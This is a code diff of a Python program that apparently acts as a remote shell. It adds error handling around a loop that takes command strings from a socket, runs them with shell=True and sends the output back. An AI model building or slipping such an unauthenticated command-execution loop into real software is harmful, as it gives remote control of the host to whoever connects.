@@ -22,11 +22,15 @@ while command != "exit":
 			clientSocket.send("Invalid directory path")
 		command = (clientSocket.recv(4064)).decode()
 	else:
-		proc = Popen(command.split(" "), stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
-		result, err = proc.communicate()
-		if(err != ""):
-			print(err)
-		clientSocket.send(result + err)
+		try:
+			proc = Popen(command.split(" "), stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
+			result, err = proc.communicate()
+			if(err != ""):
+				print(err)
+			clientSocket.send(result + err)
+		except:
+			clientSocket.send("invalid command")
+	
 		command = (clientSocket.recv(4064)).decode()
 	
 
